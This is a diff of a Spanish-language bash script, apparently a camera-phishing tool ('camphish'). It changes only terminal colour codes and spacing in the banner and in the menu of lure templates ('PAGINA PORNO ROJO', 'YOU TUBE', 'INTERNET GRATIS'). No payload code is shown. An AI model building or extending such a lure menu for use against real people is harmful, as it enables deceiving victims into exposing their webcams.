@@ -1,8 +1,8 @@
 
-white="\33[1;37m"
+white= "\33[1;37m"
 grey="\33[0;37m"
 purple="\33[0;35m"
-red="\33[1;31m"
+red= "\33[1;31m"
 green="\33[1;32m"
 yellow="\33[1;33m"
 Purple="\33[0;35m"                                                         
@@ -12,7 +12,7 @@ Fiuscha="\33[0;35m"
 blue="\33[1;34m"
 c="\[0m"
 clear
-echo -e " $red"
+echo -e "$red"
 echo "
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -162,9 +162,9 @@ banner
 camphish
 else
 printf "\n-POR DEFECTO 1-\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m PAGINA PORNO ROJO \e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YOU TUBE\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m INTERNET GRATIS \e[0m\n"
+printf "\n\e[1;31m[\e[0m\e[1;37m01\e[0m\e[1;92m]\e[0m\e[1;37m PAGINA PORNO ROJO \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;37m02\e[0m\e[1;37m]\e[0m\e[1;37m YOU TUBE\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;37m03\e[0m\e[1;37m]\e[0m\e[1;37m INTERNET GRATIS \e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] OPCION [1 O 2 O 3] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
